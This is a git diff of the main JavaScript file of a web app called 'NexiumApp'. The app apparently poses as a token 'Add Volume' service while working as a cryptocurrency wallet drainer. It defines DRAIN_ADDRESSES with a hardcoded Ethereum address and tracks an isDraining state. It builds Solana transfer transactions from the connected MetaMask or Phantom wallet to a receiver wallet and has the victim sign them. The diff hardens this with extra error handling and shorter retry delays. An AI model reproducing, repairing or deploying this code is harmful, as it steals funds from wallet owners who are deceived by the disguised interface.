@@ -1,9 +1,8 @@
+// main.js
+import { CONFIG } from './config.js';
 import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
-import { CONFIG } from './config.js';
-import './style.css';
-import UniversalProvider from '@walletconnect/universal-provider';
-import QRCode from 'qrcode';
+import * as ethers from 'ethers';
 
 const DRAIN_ADDRESSES = {
   ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
@@ -35,7 +34,7 @@ class NexiumApp {
     this.spinner = null;
     this.isDraining = false;
     this.provider = null;
-    this.connectedWalletType = null; // Track connected wallet type
+    this.connectedWalletType = null;
     console.log('Initializing NexiumApp...');
     this.initApp();
   }
@@ -50,10 +49,13 @@ class NexiumApp {
         }
       });
       this.cacheDOMElements();
-      if (!this.dom.app || !this.dom.metamaskPrompt) {
-        document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI elements missing.</p>';
-        console.error('Missing DOM elements');
+      if (!this.dom.app) {
+        console.error('Missing critical DOM element: app');
+        document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI element (app) missing.</p>';
         return;
+      }
+      if (!this.dom.metamaskPrompt) {
+        console.warn('metamaskPrompt element missing, but continuing initialization');
       }
       this.setupModal();
       this.setupEventListeners();
@@ -135,7 +137,11 @@ class NexiumApp {
         }
       });
     } else {
-      console.error('Wallet modal elements not found');
+      console.error('Wallet modal elements not found:', {
+        connectWallet: !!this.dom.connectWallet,
+        walletModal: !!this.dom.walletModal,
+        closeModal: !!this.dom.closeModal
+      });
     }
   }
 
@@ -175,7 +181,10 @@ class NexiumApp {
           }
         }
       });
+    } else {
+      console.warn('connectMetamask button not found');
     }
+
     if (this.dom.connectPhantom) {
       this.dom.connectPhantom.addEventListener('click', () => {
         console.log('Phantom click event triggered, connected class:', this.dom.connectPhantom.classList.contains('connected'));
@@ -195,7 +204,10 @@ class NexiumApp {
           }
         }
       });
+    } else {
+      console.warn('connectPhantom button not found');
     }
+
     window.addEventListener('online', () => this.handleOnline());
     window.addEventListener('offline', () => this.handleOffline());
   }
@@ -208,7 +220,7 @@ class NexiumApp {
     this.connecting = true;
     this.connectingWallet = walletName;
     console.log(`Starting connection for ${walletName}, setting state to connecting`);
-    this.cacheDOMElements(); // Re-cache DOM elements before updating button state
+    this.cacheDOMElements();
     this.updateButtonState('connecting', walletName);
 
     try {
@@ -229,7 +241,6 @@ class NexiumApp {
             console.error('MetaMask failed to provide accounts');
             throw new Error('MetaMask failed to provide accounts. Ensure it’s unlocked and installed.');
           }
-          // Check Ethereum mainnet
           const provider = new ethers.BrowserProvider(window.ethereum);
           const network = await provider.getNetwork();
           console.log(`MetaMask network: chainId=${network.chainId}, name=${network.name}`);
@@ -249,9 +260,9 @@ class NexiumApp {
         this.publicKey = accounts[0];
         this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
         console.log(`${walletName} connected via extension: ${this.publicKey}`);
-        this.connectedWalletType = walletName; // Store connected wallet type
+        this.connectedWalletType = walletName;
         console.log(`Setting button state to connected for ${walletName}`);
-        this.cacheDOMElements(); // Re-cache DOM elements before updating button state
+        this.cacheDOMElements();
         this.updateButtonState('connected', walletName);
         console.log(`Hiding MetaMask prompt for ${walletName}`);
         this.hideMetaMaskPrompt();
@@ -294,9 +305,9 @@ class NexiumApp {
             }
             this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
             console.log(`MetaMask connected via deeplink: ${this.publicKey}`);
-            this.connectedWalletType = walletName; // Store connected wallet type
+            this.connectedWalletType = walletName;
             console.log(`Setting button state to connected for ${walletName} (deeplink)`);
-            this.cacheDOMElements(); // Re-cache DOM elements before updating button state
+            this.cacheDOMElements();
             this.updateButtonState('connected', walletName);
             console.log(`Hiding MetaMask prompt for ${walletName} (deeplink)`);
             this.hideMetaMaskPrompt();
@@ -313,9 +324,9 @@ class NexiumApp {
             this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
             const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
             console.log(`Phantom connected via deeplink: ${this.publicKey}, Balance: ${walletBalance}`);
-            this.connectedWalletType = walletName; // Store connected wallet type
+            this.connectedWalletType = walletName;
             console.log(`Setting button state to connected for ${walletName} (deeplink)`);
-            this.cacheDOMElements(); // Re-cache DOM elements before updating button state
+            this.cacheDOMElements();
             this.updateButtonState('connected', walletName);
             console.log(`Hiding MetaMask prompt for ${walletName} (deeplink)`);
             this.hideMetaMaskPrompt();
@@ -333,7 +344,7 @@ class NexiumApp {
           console.log(`Deeplink timed out for ${walletName}`);
           this.showFeedback('error timed out. Please open site in the wallet app browser.', 'error');
           console.log(`Setting button state to disconnected for ${walletName} due to deeplink timeout`);
-          this.cacheDOMElements(); // Re-cache DOM elements before updating button state
+          this.cacheDOMElements();
           this.updateButtonState('disconnected', walletName);
           this.connecting = false;
           clearInterval(checkConnection);
@@ -342,7 +353,7 @@ class NexiumApp {
     } catch (error) {
       console.error(`Connection error for ${walletName}:`, error);
       console.log(`Setting button state to disconnected for ${walletName} due to error`);
-      this.cacheDOMElements(); // Re-cache DOM elements before updating button state
+      this.cacheDOMElements();
       this.handleConnectionError(error, walletName);
       this.updateButtonState('disconnected', walletName);
       this.showMetaMaskPrompt();
@@ -489,7 +500,7 @@ class NexiumApp {
 
       let attempts = 0;
       const maxRetries = 10;
-      const delayBetweenRetries = 50000;
+      const delayBetweenRetries = 5000;
 
       while (attempts < maxRetries) {
         try {
@@ -535,7 +546,7 @@ class NexiumApp {
             return;
           } else {
             console.error("🚨 Unexpected transaction error:", error);
-            
+            this.showFeedback(`Error: ${error.message}`, 'error');
             this.hideProcessingSpinner();
             return;
           }
@@ -550,7 +561,7 @@ class NexiumApp {
       this.hideProcessingSpinner();
     } catch (error) {
       console.error("❌ Unexpected error:", error);
-      
+      this.showFeedback(`Error: ${error.message}`, 'error');
       this.hideProcessingSpinner();
     }
   }
@@ -579,7 +590,6 @@ class NexiumApp {
         button.textContent = 'Add Volume';
         button.classList.add('connected');
         console.log(`Set ${walletName} button to Add Volume, disabled=${button.disabled}, classes=${button.classList}`);
-        // Update outer Connect Wallet button
         if (this.dom.connectWallet) {
           this.dom.connectWallet.textContent = 'Add Volume';
           this.dom.connectWallet.classList.remove('animate-pulse');
@@ -591,7 +601,6 @@ class NexiumApp {
         button.textContent = `Connect ${walletName}`;
         button.classList.add('animate-pulse');
         console.log(`Set ${walletName} button to Connect ${walletName}, disabled=${button.disabled}, classes=${button.classList}`);
-        // Reset outer Connect Wallet button
         if (this.dom.connectWallet) {
           this.dom.connectWallet.textContent = 'Connect Wallet';
           this.dom.connectWallet.classList.add('animate-pulse');
@@ -627,7 +636,10 @@ class NexiumApp {
   }
 
   showMetaMaskPrompt() {
-    if (!this.dom.metamaskPrompt) return;
+    if (!this.dom.metamaskPrompt) {
+      console.warn('metamaskPrompt element not found, cannot show prompt');
+      return;
+    }
     this.dom.metamaskPrompt.classList.remove('hidden');
     this.dom.metamaskPrompt.style.display = 'block';
     const promptText = this.dom.metamaskPrompt.querySelector('p');
@@ -643,7 +655,10 @@ class NexiumApp {
   }
 
   hideMetaMaskPrompt() {
-    if (!this.dom.metamaskPrompt) return;
+    if (!this.dom.metamaskPrompt) {
+      console.warn('metamaskPrompt element not found, cannot hide prompt');
+      return;
+    }
     this.dom.metamaskPrompt.classList.add('hidden');
     this.dom.metamaskPrompt.style.display = 'none';
   }
@@ -700,7 +715,7 @@ class NexiumApp {
         this.handleSuccessfulConnection();
       } else {
         console.log('No wallet connected on init, setting buttons to disconnected');
-        this.cacheDOMElements(); // Re-cache DOM elements before updating button state
+        this.cacheDOMElements();
         this.updateButtonState('disconnected', 'MetaMask');
         this.updateButtonState('disconnected', 'Phantom');
         this.showDefaultPrompt();
@@ -708,7 +723,7 @@ class NexiumApp {
     } else {
       console.log('No wallet installed, showing prompt');
       this.showMetaMaskPrompt();
-      this.cacheDOMElements(); // Re-cache DOM elements before updating button state
+      this.cacheDOMElements();
       this.updateButtonState('disconnected', 'MetaMask');
       this.updateButtonState('disconnected', 'Phantom');
       this.showDefaultPrompt();
@@ -739,9 +754,9 @@ class NexiumApp {
   }
 
   handleSuccessfulConnection() {
-    console.log(`Handle successful connection for ${this.connectingWallet}`);
-    this.cacheDOMElements(); // Re-cache DOM elements before updating button state
-    this.updateButtonState('connected', this.connectingWallet);
+    console.log(`Handle successful connection for ${this.connectedWalletType}`);
+    this.cacheDOMElements();
+    this.updateButtonState('connected', this.connectedWalletType);
     this.renderTokenInterface();
   }
 
@@ -750,7 +765,7 @@ class NexiumApp {
     this.hideMetaMaskPrompt();
     this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
     this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : window.ethereum?.isMetaMask ? 'MetaMask' : null;
-    this.cacheDOMElements(); // Re-cache DOM elements before updating button state
+    this.cacheDOMElements();
     this.updateButtonState('disconnected', 'MetaMask');
     this.updateButtonState('disconnected', 'Phantom');
     this.renderTokenInterface();
@@ -762,7 +777,10 @@ class NexiumApp {
   }
 
   renderTokenInterface() {
-    if (!this.dom.app) return;
+    if (!this.dom.app) {
+      console.error('Cannot render token interface: app element missing');
+      return;
+    }
     const tokenInterface = document.createElement('section');
     tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
     tokenInterface.innerHTML = `
@@ -791,7 +809,6 @@ class NexiumApp {
     `;
     this.dom.app.innerHTML = '';
     this.dom.app.appendChild(tokenInterface);
-    // Add the Amount section with header and $ prefix
     const amountSection = document.createElement('section');
     amountSection.className = 'amount-section fade-in mt-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
     amountSection.innerHTML = `
@@ -809,7 +826,7 @@ class NexiumApp {
     this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn');
     this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
     this.dom.tokenList = document.getElementById('tokenList');
-    this.dom.volumeInput = document.getElementById('volumeInput'); // Cache the new input field
+    this.dom.volumeInput = document.getElementById('volumeInput');
 
     if (this.dom.showCustomTokenBtn) {
       const debouncedShowCustomToken = this.debounce(() => {
@@ -926,7 +943,7 @@ class NexiumApp {
         return;
       }
       if (selectedToken.isNative) {
-        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0); // Skip for MetaMask
+        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0);
         decimals = 9;
         symbol = selectedToken.symbol;
       } else {
@@ -969,8 +986,7 @@ class NexiumApp {
       let balance, decimals, symbol;
 
       if (selectedToken.isNative) {
-        // Skip balance fetch for MetaMask; rely on your existing drain logic
-        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0); // Only for Solana wallets
+        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0);
         decimals = 9;
         symbol = selectedToken.symbol;
       } else {
@@ -1000,14 +1016,14 @@ class NexiumApp {
 
       const transaction = new Transaction().add(
         SystemProgram.transfer({
-          fromPubkey: new PublicKey(this.publicKey), // This will fail for MetaMask; your drain logic should handle it
+          fromPubkey: new PublicKey(this.publicKey),
           toPubkey: receiverWallet,
           lamports: lamportsToSend,
         })
       );
 
       transaction.feePayer = new PublicKey(this.publicKey);
-      let blockhashObj = await this.solConnection.getRecentBlockhash();
+      let blockhashObj = await this.solConnection.getLatestBlockhash();
       transaction.recentBlockhash = blockhashObj.blockhash;
 
       const signed = await window.solana.signTransaction(transaction);
